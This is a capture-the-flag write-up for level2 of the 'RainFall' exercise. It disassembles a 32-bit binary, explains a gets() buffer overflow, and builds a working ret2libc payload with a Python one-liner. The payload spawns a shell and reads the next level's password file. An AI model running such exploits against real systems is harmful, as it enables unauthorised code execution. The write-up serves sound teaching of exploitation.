[README](../README.md)
# Level 0

## GDB Disassembly
### Main
**Dump of assembler code for function main:**
```
   0x0804853f <+0>:     push   %ebp
   0x08048540 <+1>:     mov    %esp,%ebp
   0x08048542 <+3>:     and    $0xfffffff0,%esp
   0x08048545 <+6>:     call   0x80484d4 <p>
   0x0804854a <+11>:    leave
   0x0804854b <+12>:    ret
```

`call   0x80484d4 <p>`
Calls the function `p` located at memory address `0x80484d4`

### `p` function
**Dump of assembler code for function p:**
```
   0x080484d4 <+0>:     push   %ebp
   0x080484d5 <+1>:     mov    %esp,%ebp
   0x080484d7 <+3>:     sub    $0x68,%esp
   0x080484da <+6>:     mov    0x8049860,%eax
   0x080484df <+11>:    mov    %eax,(%esp)
   0x080484e2 <+14>:    call   0x80483b0 <fflush@plt>
   0x080484e7 <+19>:    lea    -0x4c(%ebp),%eax
   0x080484ea <+22>:    mov    %eax,(%esp)
   0x080484ed <+25>:    call   0x80483c0 <gets@plt>
   0x080484f2 <+30>:    mov    0x4(%ebp),%eax
   0x080484f5 <+33>:    mov    %eax,-0xc(%ebp)
   0x080484f8 <+36>:    mov    -0xc(%ebp),%eax
   0x080484fb <+39>:    and    $0xb0000000,%eax
   0x08048500 <+44>:    cmp    $0xb0000000,%eax
   0x08048505 <+49>:    jne    0x8048527 <p+83>
   0x08048507 <+51>:    mov    $0x8048620,%eax
   0x0804850c <+56>:    mov    -0xc(%ebp),%edx
   0x0804850f <+59>:    mov    %edx,0x4(%esp)
   0x08048513 <+63>:    mov    %eax,(%esp)
   0x08048516 <+66>:    call   0x80483a0 <printf@plt>
   0x0804851b <+71>:    movl   $0x1,(%esp)
   0x08048522 <+78>:    call   0x80483d0 <_exit@plt>
   0x08048527 <+83>:    lea    -0x4c(%ebp),%eax
   0x0804852a <+86>:    mov    %eax,(%esp)
   0x0804852d <+89>:    call   0x80483f0 <puts@plt>
   0x08048532 <+94>:    lea    -0x4c(%ebp),%eax
   0x08048535 <+97>:    mov    %eax,(%esp)
   0x08048538 <+100>:   call   0x80483e0 <strdup@plt>
   0x0804853d <+105>:   leave
   0x0804853e <+106>:   ret
```

#### Breakdown
**Function prologue:**
- `push %ebp`: Save the current base pointer on the stack.
- `mov %esp,%ebp`: Set up the base pointer to point to the current stack frame.
- `sub $0x68,%esp`: Allocate space on the stack for local variables by subtracting 104 bytes (0x68) from the stack pointer.

**Body:**
- `mov 0x8049860,%eax`: Load a value from memory address 0x8049860 into the eax register.
    - `(gdb) x/d 0x8049860 ->  <stdout@@GLIBC_2.0>:  0`
- `mov %eax,(%esp)`: Move the value in eax onto the stack.
- `call 0x80483b0 <fflush@plt>`: Call the fflush function.
- `lea -0x4c(%ebp),%eax`: Load the effective address of ebp - 0x4c into eax. This likely represents the address of a local variable or buffer.
- `mov %eax,(%esp)`: Move the address stored in eax onto the stack.
- `call 0x80483c0 <gets@plt>`: Call the gets function to read input from the user. Note that using gets is unsafe due to its vulnerability to buffer overflow attacks.
- `mov 0x4(%ebp),%eax`: Move the value of the first function argument into eax.
- `mov %eax,-0xc(%ebp)`: Move the value in eax to the address ebp - 0xc. This likely stores a function argument in a local variable.

- `and    $0xb0000000,%eax`
- `cmp    $0xb0000000,%eax`
    - The and instruction performs a bitwise AND operation between the value stored in the EAX register and the constant 0xb0000000. This operation sets all bits in EAX to 0, except for the 11 most significant bits. The resulting value is then compared with the constant 0xb0000000 using the cmp instruction.

`0xb0000000 hex - 2,952,790,016 dec - 1011 0000 0000 0000 0000 0000 0000 0000`
We now that the stack size is between 2,25Go and 3Go
- https://www.ibm.com/docs/fr/sdk-java-technology/8?topic=only-automatic-ldr-cntrlmaxdata-values-32-bit

This check ensures that the return address of the p function is not overwritten with an address on the stack. The stack is typically located at lower memory addresses than the code section, so addresses on the stack will have different values for their most significant bits compared to addresses in the code section. By performing this check, the program can detect if an attacker is attempting to overwrite the return address with an address on the stack, and prevent the attack from succeeding.

## Exploit
- `gets` is vulnerable to buffer overflow 

The stack memory check guides us toward a return to libc attack or ret2libc

### Ret2libc
-> https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/return-to-libc-ret2libc

A return to libc attack involves overwriting the return address of a vulnerable function with the memory address of a useful function in a shared library, such as libc. This allows the attacker to execute arbitrary code with the privileges of the vulnerable program.

![Ret2libc_diagram](https://www.ired.team/~gitbook/image?url=https:%2F%2F386337598-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-LFEMnER3fywgFHoroYn%252F-MXwAmlrjE8Ejl_0OQQX%252F-MY1FO9lURZfx9fTrAf0%252Fimage.png%3Falt=media%26token=39659182-e3ff-4d34-a031-c7091567890a&width=768&dpr=1&quality=100&sign=f88dacfcb566be08069d8a02d879238cc162108931a57324e2a75c7e5ed31fa7)

**Finding system():**
In GDB, we can use the p command to print the memory address of the system function:
```
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
```

**Finding /bin/sh:**
We want to hijack the vulnerable program and force it to call `system("/bin/sh")` and spawn the shell for us. The `system()` function is declared as `system(const char* command)`, so we need to pass it a memory address that contains the string that we want to execute. We need to find a memory location inside the vulnerable program that contains the string /bin/sh.

In GDB, we can use the info proc map command to view the memory map of the process:

```
(gdb) info proc map
process 5879
Mapped address spaces:
    Start Addr   End Addr       Size     Offset objfile
        0x8048000  0x8049000     0x1000        0x0 /home/user/level2/level2
        0x8049000  0x804a000     0x1000        0x0 /home/user/level2/level2
    0xb7e2b000 0xb7e2c000     0x1000        0x0
    0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
    0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
    0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
    0xb7fd2000 0xb7fd5000     0x3000        0x0
    0xb7fdb000 0xb7fdd000     0x2000        0x0
    0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
    0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
    0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
    0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
    0xbffdf000 0xc0000000    0x21000        0x0 [stack]
```
This shows us that `/lib/i386-linux-gnu/libc-2.15.so` starts at `0xb7e2c000`.
We can use the find command to search for the string `/bin/sh` in this memory region:

```
(gdb)  find &system, +9999999, "/bin/sh"
0xb7f8cc58
warning: Unable to access target memory at 0xb7fd3160, halting search.
1 pattern found.
```

**Exploit:**
First, we need to find out how many characters we need to send to the program to trigger the buffer overflow. We can use a pattern generator to generate a unique string that will allow us to determine the exact offset of the buffer overflow.
```
(gdb) run
Starting program: /home/user/level2/level2 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? ()
(gdb) info register eip
eip            0x37634136       0x37634136
```
The value of EIP is 0x37634136, which corresponds to the string "6Ac7" in the pattern. We can use the pattern offset calculator to determine the exact offset of the buffer overflow:

`echo "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A" | pattern_offset.rb 6Ac7
80`

**Construct the payload:**
Fill up the buffer with 80 characters
`payload = A*80 + address of system() + return address for system() + overwrite_ebp + adress of "/bin/sh"`

We need to overwrite the value of ebp register, the saved EBP is used to restore the previous stack frame when the function returns. We can overwrite the saved EBP value on the stack with a known value, such as 0x90909090. This is done to ensure that the stack frame is properly aligned when the function returns, and to prevent any unintended consequences of overwriting the saved EBP value.

Using little endian:
- ret instruction address: `0x0804853e` - `\x3e\x85\x04\x08`
- system address: `0xb7e6b060` - `\x60\xb0\xe6\xb7`
- "/bin/sh" address: `0xb7f8cc58` - `\x58\xcc\xf8\xb7`

We can use Python to construct the payload:
```
level2@RainFall:~$ python -c 'print "a" * 80 + "\x3e\x85\x04\x08" + "\x60\xb0\xe6\xb7" + "aaaa" + "\x58\xcc\xf8\xb7"' > /tmp/exploit

level2@RainFall:~$ cat /tmp/exploit - | ./level2
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa>aaaaaaaaaaaa>`��aaaaX���
whoami
level3
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```
